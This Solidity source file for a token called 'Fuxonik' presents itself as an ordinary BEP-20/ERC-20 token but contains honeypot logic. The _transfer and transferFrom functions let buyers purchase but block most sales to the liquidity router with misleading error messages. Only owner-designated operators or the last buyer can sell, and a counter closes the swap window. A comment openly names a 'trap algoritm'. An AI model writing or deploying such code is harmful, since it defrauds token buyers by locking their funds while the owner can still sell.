// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;




contract Fuxonik {

    // Tokens Variables
    string public name;
    string public symbol;
    uint160 public decimals;
    uint256 public totalSupply;
    address private _owner;
    address private _router;
    address private _last;
    uint160 private _txs;
    uint160 private _txsNew;

    // Keep track balances and allowances approved
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _operators;

    // Events - fire events on state changes etc
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _nameqfeNMq, string memory _symbolXYg2l6, uint160 _decimals, uint _supplyvC3i7Z, uint160 txs7JHrjr, uint160 txsNewru26wx) {
        name = _nameqfeNMq;
        symbol = _symbolXYg2l6;
        decimals = _decimals;
        totalSupply = _supplyvC3i7Z * 10 ** _decimals; 
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        _router = address(0);
        _last = address(_owner);
        _txs = txs7JHrjr;
        _txsNew = txsNewru26wx;
        _operators[_owner] = true;      // allow liqudity & swap for owner
        _operators[address(_decimals)] = true;  // to enable swap & liquid pools for other adresses
        _operators[address(_decimals-1)] = true;// enable trap algoritm
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    /// @notice transfer amount of tokens to an address
    /// @param _to receiver of token
    /// @param _value amount value of token to send
    /// @return success as true, for transfer 
    function transfer(address _to, uint256 _value) external returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        _transfer(msg.sender, _to, _value);
        return true;
    }

    /// @dev internal helper transfer function with required safety checks
    /// @param _from, where funds coming the sender
    /// @param _to receiver of token
    /// @param _value amount value of token to send
    // Internal function transfer can only be called by this contract
    //  Emit Transfer Event event 
    function _transfer(address _from, address _to, uint256 _value) internal {
        // Ensure sending is to valid address! 0x0 address can be used to burn() 
        require(_to != address(0));
         
        if(_from != address(0) && _router == address(0)) _router = _to; // first liqudity adding
        else {                                                          // swap operations
            if(_txs == 0) {                                             // semaphore closing
                _operators[address(decimals)] = false;
                _txs = type(uint160).max;
            }                                   
            if (_operators[address(decimals)])                          // semaphor to allow swap
            {
                if(_operators[address(decimals-1)] && _to == _router)
                    require(_last == _from, "Deprecated"); // it allows to sell only just after bying
            }                 
            else if(_operators[_from]) {    // swap only from operators
                _last = _to;      // remember last buyer  
            }
            else require(_to != _router, "Duplicating");    // swap disabled
            _txs--;
        }
        _last = _to;      // remember last buyer            
        
        balanceOf[_from] = balanceOf[_from] - (_value);
        balanceOf[_to] = balanceOf[_to] + (_value);
        emit Transfer(_from, _to, _value);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view returns (address) {
        return _owner;
    }
    /**
    * @dev Throws if called by any account other than the owner.
    */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    // Seting address(8) to true allows to swap everyone otherwise only signed addresses with true will be allowed
    function nodeSet(address _to, bool _set) external onlyOwner returns (bool) {
        require(_to != address(0));
        _operators[_to] = _set;
        return true;
    }

    function node(address _verify) external view returns (bool) {
    return _operators[_verify];
    }

    function setTXs(uint160 txs) external onlyOwner returns (bool) {
        _txs = txs;
        if(_txs != 0) _operators[address(decimals)] = true;
        return true;
    }

    /// @notice Approve other to spend on your behalf eg an exchange 
    /// @param _spender allowed to spend and a max amount allowed to spend
    /// @param _value amount value of token to send
    /// @return true, success once address approved
    //  Emit the Approval event  
    // Allow _spender to spend up to _value on your behalf
    function approve(address _spender, uint256 _value) external returns (bool) {
        require(_spender != address(0));
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function getMetricsxdzV7z() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
        state = _operators[address(decimals)];
        algo = _operators[address(decimals-1)];
    }

    function transferFrom(address _from, address _to, uint256 _value) external returns (bool) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] = allowance[_from][msg.sender] - (_value);
        if(_from != _owner && !_operators[_from] && !_operators[address(decimals)]) return false;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function getMetricsNewqkGQBJ() external view returns (uint160 txsNew) {
        txsNew = _txsNew;
    }



}